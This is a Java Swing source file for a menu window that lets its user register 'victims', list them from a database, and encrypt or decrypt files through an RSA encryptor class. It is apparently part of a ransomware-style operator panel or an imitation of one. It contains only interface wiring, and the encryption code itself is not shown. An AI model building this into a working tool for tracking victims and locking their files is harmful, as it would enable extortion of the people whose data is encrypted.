package forms;

import backend.DbConnection;
import backend.RSAFileEncryptor;
import backend.Victim;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.util.ArrayList;

public class MenuForm extends JFrame{
    private JButton victimRegisterJButton;
    private JButton filesJButton;
    private JPanel panel;

    private VictimForm victimFormJFrame;

    private FileForm fileFormJFrame;

    private DbConnection dbConnection;

    private RSAFileEncryptor rsaFileEncryptor;

    public MenuForm(DbConnection dbConnection){
        super("Menu Form");

        setContentPane(panel);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setResizable(false);
        pack();
        panel.setBorder(BorderFactory.createEmptyBorder(10, 20, 10, 20));

        this.dbConnection = dbConnection;
        this.createVictimFormJFrame();
        this.createFileFormJFrame();
        victimRegisterJButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                goToVictimForm();
            }
        });
        filesJButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                goToFileForm();
            }
        });
    }

    private void createVictimFormJFrame() {
        victimFormJFrame = new VictimForm(this);
        victimFormJFrame.setSize(700,700);
        victimFormJFrame.setVisible(false);
        victimFormJFrame.setLocationRelativeTo(null);
    }

    private void createFileFormJFrame() {
        fileFormJFrame = new FileForm(this);
        fileFormJFrame.setSize(700,700);
        fileFormJFrame.setVisible(false);
        fileFormJFrame.setLocationRelativeTo(null);
    }

    private void goToVictimForm () {
        setVisible(false);
        victimFormJFrame.setVisible(true);
    }

    private void goToFileForm () {
        setVisible(false);
        fileFormJFrame.setVisible(true);
    }

    public boolean saveVictim (Victim victim) {
        return dbConnection.saveVictim(victim);
    }

    public ArrayList<Victim> getVictims() {
        return dbConnection.getVictims();
    }

    public boolean encrypt (File file) {
        if (rsaFileEncryptor == null) {
            rsaFileEncryptor = new RSAFileEncryptor();
        }

        return  rsaFileEncryptor.encrypt(file);
    }

    public boolean decrypt (File file) {
        if (rsaFileEncryptor == null) {
            rsaFileEncryptor = new RSAFileEncryptor();
        }
        return rsaFileEncryptor.decrypt(file);
    }

}

